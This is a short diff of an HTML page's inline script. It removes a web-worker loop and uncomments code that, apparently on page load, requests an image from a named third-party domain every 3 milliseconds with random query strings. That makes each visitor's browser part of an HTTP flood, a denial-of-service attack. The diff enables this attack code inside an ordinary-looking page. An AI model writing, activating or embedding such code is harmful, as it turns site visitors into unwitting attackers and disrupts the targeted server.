@@ -2,23 +2,12 @@
   <head>
   	<script>
 
-  		var startreq = function() {
-
-	  		for(var i = 0; i< 50; i++) {
-	  			worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
-	  			worker.postMessage("H");
-			}
-
-		};
-
-		/*
 		var doreq = function(target) {
 			var pic = new Image();
 			pic.src = 'http://'+target+'/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
 		};
 
 		var startreq = function() {setTimeout(function(){setInterval(function(){doreq("saunaetkiliatlet.com")}, 3);}, 10);};
-		*/
 		
 	</script>
   </head>
